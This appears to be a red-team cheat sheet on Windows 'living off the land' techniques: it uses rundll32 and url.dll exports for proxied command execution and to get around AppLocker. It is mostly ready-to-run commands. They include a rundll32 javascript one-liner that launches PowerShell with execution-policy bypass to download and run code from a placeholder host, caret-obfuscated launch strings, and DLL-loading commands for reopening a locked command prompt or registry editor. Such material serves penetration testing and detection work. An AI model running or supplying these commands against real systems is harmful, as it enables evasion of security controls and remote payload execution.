# PASS-THRU COMMAND EXECUTION WITH ‘TelnetProtocolHandler’
https://twitter.com/nas_bench/status/1432781693279248390

1. create "telnet.exe" key in the "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths" registry
2. Set the "Default" key to any executable you want to run. 
3. Call it in CMD by running:
```
rundll32.exe url.dll,TelnetProtocolHandler
```

# PASS-THRU COMMAND EXECUTION WITH ‘OPENURL’
https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/
### URL FILE EXAMPLE (‘CALC.URL’)
```
[InternetShortcut]
URL=file:///c:\windows\system32\calc.exe
```
### COMMAND EXAMPLES
```
rundll32.exe ieframe.dll, OpenURL <path to local URL file>
rundll32.exe url.dll, OpenURL <path to local URL file>
rundll32.exe shdocvw.dll, OpenURL <path to local URL file>
```
```
rundll32.exe url.dll,OpenURL "C:\test\calc.hta"	 
rundll32.exe url.dll,OpenURL "C:\test\calc.url"	 
rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e	 
```
# PASS-THRU COMMAND EXECUTION WITH ‘FileProtocolHandler’
https://strontic.github.io/xcyclopedia/library/url.dll-3B193173A517524600C63D60FE3C0771.html
```
rundll32.exe url.dll,FileProtocolHandler calc.exe	 
rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e	 
rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta
```


DLL Exports:
1. TelnetProtocolHandler	
2. TelnetProtocolHandlerA	
3. OpenURL	
4. OpenURLA
5. URLAssociationDialogA
6. URLAssociationDialogW
7. TranslateURLA
8. TranslateURLW
9. MIMEAssociationDialogW
10. FileProtocolHandler
11. FileProtocolHandlerA
12. AddMIMEFileTypesPS
13. AutodialHookCallback
14. MailToProtocolHandlerA
15. MIMEAssociationDialogA
16. InetIsOffline	
17. MailToProtocolHandler




# Applocker Bypass
https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/

The following command needs to be executed from the command prompt. If the command prompt is locked then the method that is described below can be used to unlock the cmd.
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
```

The utility rundll32 can then load and execute the payload that is inside the pentestlab.dll.
```
rundll32 shell32.dll,Control_RunDLL C:\Users\pentestlab.dll
```
## Open Command Prompt
Since the rundll32 is a trusted Microsoft utility it can be used to load the cmd.dll into a process, execute the code on the DLL and therefore bypass the AppLocker rule and open the command prompt. The following two commands can be executed from the Windows Run:
```
rundll32 C:\cmd.dll,EntryPoint
```
OR
```
rundll32 shell32.dll,Control_RunDLL C:\cmd.dll
```
## Open Registry Editor


The following commands can load and run the regedit.dll via rundll32 and therefore bypass the AppLocker rule.
```
rundll32 C:\regedit.dll,EntryPoint
```
OR
```
rundll32 shell32.dll,Control_RunDLL C:\regedit.dll
```




# Extra References
1. https://strontic.github.io/xcyclopedia/
2. https://lolbas-project.github.io/
3. 
